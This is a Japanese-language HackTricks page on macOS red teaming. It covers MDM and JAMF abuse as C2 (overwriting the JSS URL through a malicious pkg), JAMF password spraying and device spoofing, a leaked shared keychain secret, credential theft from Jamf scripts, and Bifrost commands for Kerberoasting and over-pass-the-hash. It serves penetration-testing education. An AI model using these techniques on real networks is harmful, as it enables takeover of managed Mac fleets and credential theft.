# macOS Red Teaming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### ハッカーの視点であなたのウェブアプリ、ネットワーク、クラウドを評価する

**実際のビジネスに影響を与える重大で悪用可能な脆弱性を見つけて報告します。** 20以上のカスタムツールを使用して攻撃面をマッピングし、特権を昇格させるセキュリティ問題を見つけ、自動化されたエクスプロイトを使用して重要な証拠を収集し、あなたの努力を説得力のある報告書に変えます。

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## MDMの悪用

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

管理プラットフォームにアクセスするために**管理者資格情報を侵害**することができれば、マシンにマルウェアを配布することで**すべてのコンピュータを侵害する可能性があります**。

MacOS環境でのレッドチーミングには、MDMの動作についての理解が非常に推奨されます：

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### C2としてのMDMの使用

MDMは、プロファイルのインストール、クエリ、削除、アプリケーションのインストール、ローカル管理者アカウントの作成、ファームウェアパスワードの設定、FileVaultキーの変更を行う権限を持っています...

独自のMDMを実行するには、**ベンダーによって署名されたCSRが必要**で、[**https://mdmcert.download/**](https://mdmcert.download/)を使用して取得を試みることができます。Appleデバイス用の独自のMDMを実行するには、[**MicroMDM**](https://github.com/micromdm/micromdm)を使用できます。

ただし、登録されたデバイスにアプリケーションをインストールするには、開発者アカウントによって署名されている必要があります... しかし、MDM登録時に**デバイスはMDMのSSL証明書を信頼されたCAとして追加するため**、今では何でも署名できます。

デバイスをMDMに登録するには、**`mobileconfig`**ファイルをルートとしてインストールする必要があり、これは**pkg**ファイルを介して配布できます（zipで圧縮し、Safariからダウンロードすると解凍されます）。

**Mythic agent Orthrus**はこの技術を使用しています。

### JAMF PROの悪用

JAMFは**カスタムスクリプト**（システム管理者によって開発されたスクリプト）、**ネイティブペイロード**（ローカルアカウントの作成、EFIパスワードの設定、ファイル/プロセスの監視...）および**MDM**（デバイスの構成、デバイス証明書...）を実行できます。

#### JAMF自己登録

`https://<company-name>.jamfcloud.com/enroll/`のようなページにアクセスして、**自己登録が有効かどうか**を確認します。有効な場合、**アクセスするための資格情報を要求されることがあります**。

スクリプト[**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py)を使用してパスワードスプレー攻撃を実行できます。

さらに、適切な資格情報を見つけた後、次のフォームを使用して他のユーザー名をブルートフォース攻撃できる可能性があります：

![](<../../.gitbook/assets/image (107).png>)

#### JAMFデバイス認証

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`**バイナリには、キーチェーンを開くための秘密が含まれており、発見時には**誰もが共有**していたもので、**`jk23ucnq91jfu9aj`**でした。\
さらに、jamfは**`/Library/LaunchAgents/com.jamf.management.agent.plist`**に**LaunchDaemon**として**持続**します。

#### JAMFデバイスタケオーバー

**JSS**（Jamf Software Server）**URL**は、**`jamf`**が使用するもので、**`/Library/Preferences/com.jamfsoftware.jamf.plist`**にあります。\
このファイルには基本的にURLが含まれています：

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

したがって、攻撃者は、インストール時にこのファイルを**上書きする**悪意のあるパッケージ（`pkg`）をドロップし、**TyphonエージェントからのMythic C2リスナーへのURLを設定する**ことで、JAMFをC2として悪用できるようになります。

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMFなりすまし

デバイスとJMF間の**通信をなりすます**ためには、以下が必要です：

* デバイスの**UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* デバイス証明書を含む**JAMFキーチェーン**: `/Library/Application\ Support/Jamf/JAMF.keychain`

この情報をもとに、**盗まれた**ハードウェア**UUID**を持ち、**SIPを無効にした**VMを**作成**し、**JAMFキーチェーンを配置**し、Jamf**エージェントをフック**してその情報を盗みます。

#### 秘密の盗難

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

管理者がJamfを介して実行したい**カスタムスクリプト**を監視するために、`/Library/Application Support/Jamf/tmp/`の場所を監視することもできます。これらのスクリプトは**ここに配置され、実行され、削除されます**。これらのスクリプトには**資格情報が含まれている可能性があります**。

ただし、**資格情報**はこれらのスクリプトに**パラメータ**として渡される可能性があるため、`ps aux | grep -i jamf`を監視する必要があります（ルートでなくても可能です）。

スクリプト[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py)は、新しいファイルが追加されるのをリスンし、新しいプロセス引数を監視できます。

### macOSリモートアクセス

また、**MacOS**の「特別な」**ネットワーク****プロトコル**についても：

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

場合によっては、**MacOSコンピュータがADに接続されている**ことがあります。このシナリオでは、慣れているように**アクティブディレクトリを列挙**しようとするべきです。以下のページで**ヘルプ**を見つけてください：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

役立つ**ローカルMacOSツール**の一つは`dscl`です：
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
また、ADを自動的に列挙し、kerberosで遊ぶためのMacOS用のツールがいくつか用意されています：

* [**Machound**](https://github.com/XMCyber/MacHound): MacHoundは、MacOSホスト上のActive Directory関係を収集および取り込むことを可能にするBloodhound監査ツールの拡張です。
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrostは、macOS上のHeimdal krb5 APIと対話するために設計されたObjective-Cプロジェクトです。このプロジェクトの目標は、ターゲットに他のフレームワークやパッケージを必要とせず、ネイティブAPIを使用してmacOSデバイス上のKerberosに関するセキュリティテストを向上させることです。
* [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directoryの列挙を行うためのJavaScript for Automation (JXA)ツールです。

### ドメイン情報
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### ユーザー

MacOSのユーザーには3種類あります：

* **ローカルユーザー** — ローカルOpenDirectoryサービスによって管理されており、Active Directoryとは何の接続もありません。
* **ネットワークユーザー** — 認証のためにDCサーバーへの接続を必要とする揮発性のActive Directoryユーザーです。
* **モバイルユーザー** — 認証情報とファイルのローカルバックアップを持つActive Directoryユーザーです。

ユーザーとグループに関するローカル情報は、フォルダー _/var/db/dslocal/nodes/Default._ に保存されています。\
例えば、_mark_ というユーザーに関する情報は _/var/db/dslocal/nodes/Default/users/mark.plist_ に保存されており、_admin_ というグループに関する情報は _/var/db/dslocal/nodes/Default/groups/admin.plist_ にあります。

HasSessionおよびAdminToエッジを使用することに加えて、**MacHoundはBloodhoundデータベースに3つの新しいエッジを追加します**：

* **CanSSH** - ホストにSSH接続を許可されたエンティティ
* **CanVNC** - ホストにVNC接続を許可されたエンティティ
* **CanAE** - ホスト上でAppleEventスクリプトを実行することを許可されたエンティティ
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
More info in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ パスワード

パスワードを取得するには:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** パスワードにシステムキーチェーン内でアクセスすることが可能です。

### Over-Pass-The-Hash

特定のユーザーとサービスのためにTGTを取得します：
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGTが収集されると、次のコマンドで現在のセッションに注入することが可能です:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
取得したサービスチケットを使用して、他のコンピュータの共有にアクセスを試みることができます：
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## キーチェーンへのアクセス

キーチェーンには、プロンプトを生成せずにアクセスされると、レッドチームの演習を進めるのに役立つ可能性のある機密情報が含まれている可能性が高いです：

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## 外部サービス

MacOSのレッドチーミングは、通常**MacOSがいくつかの外部プラットフォームと直接統合されている**ため、通常のWindowsレッドチーミングとは異なります。MacOSの一般的な構成は、**OneLoginで同期された資格情報を使用してコンピュータにアクセスし、OneLoginを介していくつかの外部サービス**（github、awsなど）にアクセスすることです。

## その他のレッドチーム技術

### Safari

Safariでファイルがダウンロードされると、それが「安全な」ファイルであれば、**自動的に開かれます**。例えば、**zipをダウンロード**すると、自動的に解凍されます：

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## 参考文献

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### ハッカーの視点であなたのウェブアプリ、ネットワーク、クラウドを評価する

**実際のビジネスに影響を与える重大で悪用可能な脆弱性を見つけて報告します。** 20以上のカスタムツールを使用して攻撃面をマッピングし、特権を昇格させるセキュリティ問題を見つけ、自動化されたエクスプロイトを使用して重要な証拠を収集し、あなたの努力を説得力のある報告書に変えます。

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
